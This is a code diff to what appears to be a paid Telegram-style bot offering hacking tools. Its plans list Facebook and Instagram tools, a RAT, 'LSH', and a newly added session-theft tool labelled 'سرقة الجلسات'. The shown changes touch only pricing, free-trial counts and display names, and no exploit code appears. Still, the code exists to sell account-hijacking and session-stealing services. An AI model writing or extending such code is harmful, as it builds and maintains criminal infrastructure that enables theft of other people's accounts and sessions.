@@ -27,7 +27,7 @@ PRICING_PLANS = {
         "stars": 150,
         "days": 30,
         "daily_limit": 100,
-        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH"]
+        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH"]
     },
     "vip": {
         "name": "باقة VIP",
@@ -39,7 +39,7 @@ PRICING_PLANS = {
 }
 
 FREE_TRIAL_USES = 1
-AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh"]
+AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
 
 # ============================================================
 # [2] Redis
@@ -110,7 +110,6 @@ def get_or_create_user(user_id, username="Unknown", first_name="User"):
     user = get_user(user_id)
     if not user:
         user = create_new_user(user_id, username, first_name)
-    # إذا كانت نسخة قديمة، أضف الحقول الجديدة
     if "trial_uses" not in user:
         user["trial_uses"] = {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS}
     for tool in AVAILABLE_TOOLS:
@@ -225,7 +224,14 @@ def build_account_text(user_id):
     user = _reset_daily_counter_if_needed(user)
 
     trial = user.get("trial_uses", {})
-    tool_names = {"fb": "فيسبوك", "ig": "انستقرام", "qr": "QR Code", "rat": "RAT", "lsh": "LSH"}
+    tool_names = {
+        "fb": "فيسبوك",
+        "ig": "انستقرام",
+        "qr": "QR Code",
+        "rat": "RAT",
+        "lsh": "LSH",
+        "sh": "سرقة الجلسات",
+    }
 
     trial_lines = []
     for tool, count in trial.items():
